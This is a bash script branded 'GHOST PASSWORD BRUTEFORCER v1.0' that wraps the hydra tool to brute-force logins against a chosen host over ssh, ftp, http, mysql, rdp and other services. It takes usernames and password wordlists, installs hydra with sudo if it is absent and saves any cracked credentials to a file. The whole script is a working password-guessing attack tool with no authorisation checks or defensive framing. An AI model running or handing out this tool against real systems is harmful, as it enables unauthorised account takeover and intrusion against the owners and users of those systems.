#!/bin/bash

TARGET=""
USER=""
PASSLIST=""
SERVICE="ssh"
THREADS=16

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target) TARGET="$2"; shift 2 ;;
        -u|--user) USER="$2"; shift 2 ;;
        -U|--userlist) USERLIST="$2"; shift 2 ;;
        -p|--password) PASSWORD="$2"; shift 2 ;;
        -P|--passlist) PASSLIST="$2"; shift 2 ;;
        -s|--service) SERVICE="$2"; shift 2 ;;
        -th|--threads) THREADS="$2"; shift 2 ;;
        -h|--help)
            echo "Usage: $0 -t <target> -s <service> [options]"
            echo ""
            echo "Options:"
            echo "  -t, --target <host>     Target host"
            echo "  -u, --user <username>   Single username"
            echo "  -U, --userlist <file>   Username wordlist"
            echo "  -p, --password <pass>   Single password"
            echo "  -P, --passlist <file>   Password wordlist"
            echo "  -s, --service <svc>     Service: ssh, ftp, http, mysql, rdp, etc"
            echo "  -th, --threads <num>    Threads (default: 16)"
            echo "  -h, --help              Show this help"
            echo ""
            echo "Examples:"
            echo "  $0 -t 192.168.1.1 -u admin -P wordlist.txt -s ssh"
            echo "  $0 -t 10.0.0.1 -U users.txt -P passwords.txt -s rdp"
            exit 0 ;;
        *) shift ;;
    esac
done

[ -z "$TARGET" ] && { echo "[!] Target required"; exit 1; }

if [ -z "$PASSLIST" ] && [ -z "$PASSWORD" ]; then
    echo "[!] Password or passlist required"
    exit 1
fi

mkdir -p ~/ghost_toolkit/scans
OUTPUT=~/ghost_toolkit/scans/hydra_$(date +%Y%m%d_%H%M%S).txt

echo "======================================"
echo "    GHOST PASSWORD BRUTEFORCER v1.0  "
echo "======================================"
echo "[*] Target: $TARGET"
echo "[*] Service: $SERVICE"
echo ""

USER_ARGS=""
[ -n "$USER" ] && USER_ARGS="-l $USER"
[ -n "$USERLIST" ] && USER_ARGS="-L $USERLIST"

PASS_ARGS=""
[ -n "$PASSWORD" ] && PASS_ARGS="-p $PASSWORD"
[ -n "$PASSLIST" ] && PASS_ARGS="-P $PASSLIST"

if command -v hydra &> /dev/null; then
    hydra -t $THREADS $USER_ARGS $PASS_ARGS -o "$OUTPUT" "$TARGET" $SERVICE
else
    echo "[!] hydra not found!"
    echo "[*] Installing hydra..."
    sudo apt install -y hydra
    hydra -t $THREADS $USER_ARGS $PASS_ARGS -o "$OUTPUT" "$TARGET" $SERVICE
fi

echo ""
echo "[+] Scan complete! Results saved to $OUTPUT"
